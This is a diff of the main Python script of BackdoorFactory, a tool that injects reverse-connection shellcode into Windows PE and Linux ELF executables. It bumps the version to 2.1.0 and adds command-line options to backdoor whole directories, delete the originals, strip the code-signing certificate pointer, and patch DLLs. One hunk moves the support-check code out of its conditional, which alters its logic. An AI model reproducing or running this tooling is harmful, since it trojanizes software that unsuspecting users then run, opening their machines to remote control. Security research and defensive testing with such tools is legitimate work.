@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 '''
-    BackdoorFactory (BDF) v2.0 - Tertium Quid 
+    BackdoorFactory (BDF) v2 - Tertium Quid 
 
     Many thanks to Ryan O'Neill --ryan 'at' codeslum <d ot> org--
     Without him, I would still be trying to do stupid things 
@@ -55,7 +55,7 @@ def signal_handler(signal, frame):
 class bdfMain():
 
     version = """\
-         2.0.9
+         2.1.0
          """
 
     author = """\
@@ -129,12 +129,14 @@ class bdfMain():
     parser.add_option("-f", "--file", dest="FILE", action="store",
                       type="string",
                       help="File to backdoor")
-    parser.add_option("-s", "--shell", dest="SHELL", action="store",
-                      type="string",
-                      help="Payloads that are available for use.")
+    parser.add_option("-s", "--shell", default="show", dest="SHELL", 
+                      action="store", type="string",
+                      help="Payloads that are available for use."
+                      " Use 'show' to see payloads."
+                      )
     parser.add_option("-H", "--hostip", default=None, dest="HOST",
                       action="store", type="string",
-                      help="IP of the C2 for reverse connections")
+                      help="IP of the C2 for reverse connections.")
     parser.add_option("-P", "--port", default=None, dest="PORT",
                       action="store", type="int",
                       help="The port to either connect back to for reverse "
@@ -193,13 +195,13 @@ class bdfMain():
                       action="store", type="string",
                       help="For use with injector, places a suffix"
                       " on the original file for easy recovery")
-    parser.add_option("-D", "--delete_original", default=False,
-                      dest="DELETE_ORIGINAL", action="store_true",
+    parser.add_option("-D", "--delete_original", dest="DELETE_ORIGINAL",
+                      default=False, action="store_true",
                       help="For use with injector module.  This command"
                       " deletes the original file.  Not for use in production "
                       "systems.  *Author not responsible for stupid uses.*")
-    parser.add_option("-O", "--disk_offset", default=0,
-                      dest="DISK_OFFSET", type="int", action="store",
+    parser.add_option("-O", "--disk_offset", dest="DISK_OFFSET", default=0,
+                      type="int", action="store",
                       help="Starting point on disk offset, in bytes. "
                       "Some authors want to obfuscate their on disk offset "
                       "to avoid reverse engineering, if you find one of those "
@@ -211,12 +213,31 @@ class bdfMain():
                       "verbose. This check happens automatically if the "
                       "backdooring is attempted."
                       )
+    parser.add_option("-M", "--cave-miner", dest="CAVE_MINER", default=False, action="store_true",
+                      help="Future use, to help determine smallest shellcode possible in a PE file"
+                      )
     parser.add_option("-q", "--no_banner", dest="NO_BANNER", default=False, action="store_true",
                       help="Kills the banner."
                       )
     parser.add_option("-v", "--verbose", default=False, dest="VERBOSE",
                       action="store_true",
                       help="For debug information output.")
+    parser.add_option("-T", "--image-type", dest="IMAGE_TYPE", default="ALL",
+                      type='string',
+                      action="store", help="ALL, x32, or x64 type binaries only. Default=ALL")
+    parser.add_option("-Z", "--zero_cert", dest="ZERO_CERT", default=True, action="store_false",
+                      help="Allows for the overwriting of the pointer to the PE certificate table"
+                      " effectively removing the certificate from the binary for all intents"
+                      " and purposes."
+                      )
+    parser.add_option("-R", "--runas_admin", dest="CHECK_ADMIN", default=False, action="store_true",
+                      help="Checks the PE binaries for \'requestedExecutionLevel level=\"highestAvailable\"\'"
+                      ". If this string is included in the binary, it must run as system/admin. Doing this "
+                      "slows patching speed significantly."
+                      )
+    parser.add_option("-L", "--patch_dll", dest="PATCH_DLL", default=True, action="store_false",
+                      help="Use this setting if you DON'T want to patch DLLs. Patches by default."
+                     )
 
     (options, args) = parser.parse_args()
 
@@ -244,58 +265,65 @@ class bdfMain():
         for root, subFolders, files in os.walk(options.DIR):
             for _file in files:
                 options.FILE = os.path.join(root, _file)
-		if os.path.isdir(options.FILE) is True:
-		    print "Directory found, continuing"
-		    continue
-		is_supported = basicDiscovery(options.FILE)
+                if os.path.isdir(options.FILE) is True:
+                    print "Directory found, continuing"
+                    continue
+                is_supported = basicDiscovery(options.FILE)
                 if is_supported is "PE":
-		    supported_file = pebin(options.FILE,
-                                options.OUTPUT,
-                                options.SHELL,
-                                options.NSECTION,
-                                options.DISK_OFFSET,
-                                options.ADD_SECTION,
-                                options.CAVE_JUMPING,
-                                options.PORT,
-                                options.HOST,
-                                options.SUPPLIED_SHELLCODE,
-                                options.INJECTOR,
-                                options.CHANGE_ACCESS,
-                                options.VERBOSE,
-                                options.SUPPORT_CHECK,
-                                options.SHELL_LEN,
-                                options.FIND_CAVES,
-                                options.SUFFIX,
-                                options.DELETE_ORIGINAL)
+                    supported_file = pebin(options.FILE,
+                                            options.OUTPUT,
+                                            options.SHELL,
+                                            options.NSECTION,
+                                            options.DISK_OFFSET,
+                                            options.ADD_SECTION,
+                                            options.CAVE_JUMPING,
+                                            options.PORT,
+                                            options.HOST,
+                                            options.SUPPLIED_SHELLCODE,
+                                            options.INJECTOR,
+                                            options.CHANGE_ACCESS,
+                                            options.VERBOSE,
+                                            options.SUPPORT_CHECK,
+                                            options.SHELL_LEN,
+                                            options.FIND_CAVES,
+                                            options.SUFFIX,
+                                            options.DELETE_ORIGINAL,
+                                            options.CAVE_MINER,
+                                            options.IMAGE_TYPE,
+                                            options.ZERO_CERT,
+                                            options.CHECK_ADMIN,
+                                            options.PATCH_DLL
+                                            )
                 elif is_supported is "ELF":
                     supported_file = elfbin(options.FILE,
-                                options.OUTPUT,
-                                options.SHELL,
-                                options.HOST,
-                                options.PORT,
-                                options.SUPPORT_CHECK,
-                                options.FIND_CAVES,
-                                options.SHELL_LEN,
-                                options.SUPPLIED_SHELLCODE
-				)
-                				
+                                            options.OUTPUT,
+                                            options.SHELL,
+                                            options.HOST,
+                                            options.PORT,
+                                            options.SUPPORT_CHECK,
+                                            options.FIND_CAVES,
+                                            options.SHELL_LEN,
+                                            options.SUPPLIED_SHELLCODE,
+                                            options.IMAGE_TYPE
+                                            )
+                                        
                 if options.SUPPORT_CHECK is True:
                     if os.path.isfile(options.FILE):
                         is_supported = False
-			print "file", options.FILE
-                        try:
-                            is_supported = supported_file.support_check()
-                        except Exception, e:
-                            is_supported = False
-                            print 'Exception:', str(e), '%s' % options.FILE
-			if is_supported is False or is_supported is None:
-                            print "%s is not supported." % options.FILE
+                print "file", options.FILE
+                try:
+                    is_supported = supported_file.support_check()
+                except Exception, e:
+                    is_supported = False
+                    print 'Exception:', str(e), '%s' % options.FILE
+                if is_supported is False or is_supported is None:
+                    print "%s is not supported." % options.FILE
                             #continue
-                        else:
-                            print "%s is supported." % options.FILE
-                        #    if supported_file.flItms['runas_admin'] is True:
-                        #        print "%s must be run as admin." % options.FILE
-                        print "*" * 50
+                else:
+                    print "%s is supported." % options.FILE
+                #    if supported_file.flItms['runas_admin'] is True:
+                #        print "%s must be run as admin." % options.FILE
+                print "*" * 50
         
         if options.SUPPORT_CHECK is True:
             sys.exit()
@@ -312,59 +340,65 @@ class bdfMain():
                 #print item
                 print "*" * 50
                 options.FILE = options.DIR + '/' + item
-		if os.path.isdir(options.FILE) is True:
-		    print "Directory found, continuing"
-		    continue
+                if os.path.isdir(options.FILE) is True:
+                    print "Directory found, continuing"
+                    continue
                 
-		print ("backdooring file %s" % item)
+                print ("backdooring file %s" % item)
                 result = None
                 is_supported = basicDiscovery(options.FILE)
                 try:
                     if is_supported is "PE":
                         supported_file = pebin(options.FILE,
-                                    options.OUTPUT,
-                                    options.SHELL,
-                                    options.NSECTION,
-                                    options.DISK_OFFSET,
-                                    options.ADD_SECTION,
-                                    options.CAVE_JUMPING,
-                                    options.PORT,
-                                    options.HOST,
-                                    options.SUPPLIED_SHELLCODE,
-                                    options.INJECTOR,
-                                    options.CHANGE_ACCESS,
-                                    options.VERBOSE,
-                                    options.SUPPORT_CHECK,
-                                    options.SHELL_LEN,
-                                    options.FIND_CAVES,
-                                    options.SUFFIX,
-                                    options.DELETE_ORIGINAL)
+                                                options.OUTPUT,
+                                                options.SHELL,
+                                                options.NSECTION,
+                                                options.DISK_OFFSET,
+                                                options.ADD_SECTION,
+                                                options.CAVE_JUMPING,
+                                                options.PORT,
+                                                options.HOST,
+                                                options.SUPPLIED_SHELLCODE,
+                                                options.INJECTOR,
+                                                options.CHANGE_ACCESS,
+                                                options.VERBOSE,
+                                                options.SUPPORT_CHECK,
+                                                options.SHELL_LEN,
+                                                options.FIND_CAVES,
+                                                options.SUFFIX,
+                                                options.DELETE_ORIGINAL,
+                                                options.CAVE_MINER,
+                                                options.IMAGE_TYPE,
+                                                options.ZERO_CERT,
+                                                options.CHECK_ADMIN,
+                                                options.PATCH_DLL
+                                                )
                         supported_file.OUTPUT = None
                         supported_file.output_options()
                         result = supported_file.patch_pe()
                     elif is_supported is "ELF":
                         supported_file = elfbin(options.FILE,
-                                options.OUTPUT,
-                                options.SHELL,
-                                options.HOST,
-                                options.PORT,
-                                options.SUPPORT_CHECK,
-                                options.FIND_CAVES,
-                                options.SHELL_LEN,
-                                options.SUPPLIED_SHELLCODE
-				)
+                                                options.OUTPUT,
+                                                options.SHELL,
+                                                options.HOST,
+                                                options.PORT,
+                                                options.SUPPORT_CHECK,
+                                                options.FIND_CAVES,
+                                                options.SHELL_LEN,
+                                                options.SUPPLIED_SHELLCODE,
+                                                options.IMAGE_TYPE
+                                                )
                         supported_file.OUTPUT = None
                         supported_file.output_options()
                         result = supported_file.patch_elf()
                     
-		    if result is None:
+                    if result is None:
                         print 'Not Supported. Continuing'
                         continue
                     else:
                         print ("[*] File {0} is in backdoored "
                                "directory".format(supported_file.FILE))
                 except Exception as e:
-                    
                     print "DIR ERROR",str(e)
         else:
             print("Goodbye")
@@ -389,7 +423,12 @@ class bdfMain():
                                 options.SHELL_LEN,
                                 options.FIND_CAVES,
                                 options.SUFFIX,
-                                options.DELETE_ORIGINAL)
+                                options.DELETE_ORIGINAL,
+                                options.IMAGE_TYPE,
+                                options.ZERO_CERT,
+                                options.CHECK_ADMIN,
+                                options.PATCH_DLL
+                                )
         supported_file.injector()
         sys.exit()
 
@@ -417,7 +456,13 @@ class bdfMain():
                                 options.SHELL_LEN,
                                 options.FIND_CAVES,
                                 options.SUFFIX,
-                                options.DELETE_ORIGINAL)
+                                options.DELETE_ORIGINAL,
+                                options.CAVE_MINER,
+                                options.IMAGE_TYPE,
+                                options.ZERO_CERT,
+                                options.CHECK_ADMIN,
+                                options.PATCH_DLL
+                                )
     elif is_supported is "ELF":
         supported_file = elfbin(options.FILE,
                                 options.OUTPUT,
@@ -427,7 +472,9 @@ class bdfMain():
                                 options.SUPPORT_CHECK,
                                 options.FIND_CAVES,
                                 options.SHELL_LEN,
-                                options.SUPPLIED_SHELLCODE)
+                                options.SUPPLIED_SHELLCODE,
+                                options.IMAGE_TYPE
+                                )
 
     result = supported_file.run_this()
     if result is True:
